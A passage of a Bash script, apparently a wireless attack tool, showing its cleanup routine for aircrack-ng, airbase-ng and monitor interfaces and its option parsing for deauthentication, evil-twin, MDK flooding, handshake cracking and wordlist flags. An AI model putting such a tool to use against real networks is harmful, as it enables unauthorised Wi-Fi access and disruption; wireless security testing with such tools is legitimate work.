	killall aircrack-ng 2> /dev/null
	killall airbase-ng 2> /dev/null
	rm -rf $HOME/tmp* 2> /dev/null
	if [ $CRACK = "1" ] 2> /dev/null
		then
			exit
		else
			MOND="$(ifconfig | grep mon | cut -d ' ' -f 1)"
			if [ $MOND -z ] 2> /dev/null
				then
					A=1
				else
					echo $GRN
					for NIC in $MOND
						do
							airmon-ng stop $NIC | grep remodertd
							echo " [*] Monitor $NIC removed. "
						done
			fi
			echo
			if [ $GPS = 1 ] 2> /dev/null
				then
					
					killall -9 gpspipe 2> /dev/null
					rm -rf $HOME/gpslog
					echo $RED" [*]$GRN Android GPS$RED shutting down..."
					rm -rf $HOME/BSSIDF 2> /dev/null
					echo
				else
					/etc/init.d/networking start
					service network-manager start
			fi
			echo $RED" [*] All monitor devices have been shut down,$GRN Goodbye...$RST"
			exit
	fi
}

trap fexit 2
																		#Parse command line arguments
if [ $# -lt 1 ] 2> /dev/null
	then
		fhelp
fi

ACNT=1
for ARG in $@
	do
		ACNT=$((ACNT + 1))
		case $ARG in "-m")MDK=1;;"-b")EVIL=1;;"-t")TIMEOUT=$(echo $@ | cut -d " " -f $ACNT);;"-g")GPS=1;;"-i2")NIC2=$(echo $@ | cut -d " " -f $ACNT);;"-s")SILENT=1;;"-o")OUTDIR=$(echo $@ | cut -d " " -f $ACNT);;"-p")POWERLIMIT=$(echo $@ | cut -d " " -f $ACNT);;"-d")DEAU=1;TRIES=$(echo $@ | cut -d " " -f $ACNT);;"-c")CRACK=1;PCAP=$(echo $@ | cut -d " " -f $ACNT);;"-l")DO='L';;"-h")fhelp;;"-e")DO='E';ACNT=$((ACNT - 1));PARTIALESSID=$(echo $@ | cut -d " " -f $ACNT);;"-i")NIC=$(echo $@ | cut -d " " -f $ACNT);;"-w")WORDLIST=$(echo $@ | cut -d " " -f $ACNT);;"-a")DO='A';;"")fstart;esac
	done
fstart
